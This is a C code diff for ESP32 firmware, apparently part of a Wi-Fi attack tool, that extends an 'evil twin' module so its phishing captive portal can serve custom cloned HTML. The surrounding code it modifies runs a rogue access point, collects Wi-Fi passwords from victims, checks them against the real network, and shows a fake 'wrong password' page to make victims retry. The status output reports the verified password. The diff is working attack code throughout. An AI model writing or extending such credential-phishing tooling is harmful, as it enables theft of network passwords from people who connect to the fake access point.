@@ -134,6 +134,9 @@ static char                     et_verified_pw[EVILTWIN_MAX_PW_LEN] = {0};
 /* Captive portal HTML loaded from SPIFFS (or fallback) */
 static char                    *et_index_html        = NULL;
 static char                    *et_wrong_html        = NULL;
+/* Custom HTML from provision capture (overrides SPIFFS / fallback) */
+static char                    *et_custom_index_html = NULL;
+static char                    *et_custom_wrong_html = NULL;
 
 /* Captive portal HTTP server handle */
 static httpd_handle_t           et_portal_server     = NULL;
@@ -157,6 +160,9 @@ static bool verify_password_against_ap(const char *ssid, const char *password);
 static esp_err_t portal_root_handler(httpd_req_t *req);
 static esp_err_t portal_password_handler(httpd_req_t *req);
 static esp_err_t portal_catchall_handler(httpd_req_t *req);
+
+/* Public helpers used before their definitions */
+bool attack_eviltwin_has_custom_portal(void);
 
 /* ------------------------------------------------------------------ */
 /*  SPIFFS HTML loader                                                 */
@@ -450,7 +456,8 @@ static void dns_server_task(void *arg) {
 static esp_err_t portal_root_handler(httpd_req_t *req) {
     et_portal_hits++;
 
-    const char *html = et_index_html ? et_index_html : fallback_index_html;
+    const char *html = et_custom_index_html ? et_custom_index_html
+                       : (et_index_html ? et_index_html : fallback_index_html);
     httpd_resp_set_type(req, "text/html");
     httpd_resp_send(req, html, strlen(html));
     return ESP_OK;
@@ -531,7 +538,8 @@ static esp_err_t portal_password_handler(httpd_req_t *req) {
     }
 
     /* Show "wrong password" page to get them to try again */
-    const char *html = et_wrong_html ? et_wrong_html : fallback_wrong_html;
+    const char *html = et_custom_wrong_html ? et_custom_wrong_html
+                       : (et_wrong_html ? et_wrong_html : fallback_wrong_html);
     httpd_resp_set_type(req, "text/html");
     httpd_resp_send(req, html, strlen(html));
     return ESP_OK;
@@ -961,7 +969,8 @@ const char *attack_eviltwin_get_status_json(void) {
     snprintf(json_buf, sizeof(json_buf),
         "{\"running\":%s,\"ssid\":\"%s\",\"channel\":%d,"
         "\"captured_count\":%d,\"portal_hits\":%d,\"clients\":%d,"
-        "\"password_verified\":%s,\"verified_password\":\"%s\"}",
+        "\"password_verified\":%s,\"verified_password\":\"%s\","
+        "\"custom_portal\":%s}",
         st.running ? "true" : "false",
         st.target_ssid,
         st.target_channel,
@@ -969,9 +978,62 @@ const char *attack_eviltwin_get_status_json(void) {
         st.portal_hits,
         st.clients_connected,
         st.password_verified ? "true" : "false",
-        st.verified_password);
+        st.verified_password,
+        attack_eviltwin_has_custom_portal() ? "true" : "false");
 
     return json_buf;
+}
+
+esp_err_t attack_eviltwin_set_portal_html(const char *index_html,
+                                          const char *wrong_html) {
+    if (!index_html || !index_html[0]) return ESP_ERR_INVALID_ARG;
+    size_t index_len = strlen(index_html);
+    if (index_len > CAPTIVE_PORTAL_MAX_HTML) return ESP_ERR_INVALID_SIZE;
+
+    char *new_index = malloc(index_len + 1);
+    if (!new_index) return ESP_ERR_NO_MEM;
+    memcpy(new_index, index_html, index_len + 1);
+
+    char *new_wrong = NULL;
+    if (wrong_html && wrong_html[0]) {
+        size_t wrong_len = strlen(wrong_html);
+        if (wrong_len > CAPTIVE_PORTAL_MAX_HTML) {
+            free(new_index);
+            return ESP_ERR_INVALID_SIZE;
+        }
+        new_wrong = malloc(wrong_len + 1);
+        if (!new_wrong) {
+            free(new_index);
+            return ESP_ERR_NO_MEM;
+        }
+        memcpy(new_wrong, wrong_html, wrong_len + 1);
+    }
+
+    ensure_mutex();
+    xSemaphoreTake(et_mutex, portMAX_DELAY);
+    free(et_custom_index_html);
+    free(et_custom_wrong_html);
+    et_custom_index_html = new_index;
+    et_custom_wrong_html = new_wrong;
+    xSemaphoreGive(et_mutex);
+
+    ESP_LOGI(TAG, "Custom captive portal HTML installed (%u bytes)",
+             (unsigned)index_len);
+    return ESP_OK;
+}
+
+void attack_eviltwin_clear_portal_html(void) {
+    ensure_mutex();
+    xSemaphoreTake(et_mutex, portMAX_DELAY);
+    free(et_custom_index_html);
+    free(et_custom_wrong_html);
+    et_custom_index_html = NULL;
+    et_custom_wrong_html = NULL;
+    xSemaphoreGive(et_mutex);
+}
+
+bool attack_eviltwin_has_custom_portal(void) {
+    return et_custom_index_html != NULL && et_custom_index_html[0] != '\0';
 }
 
 /* ------------------------------------------------------------------ */
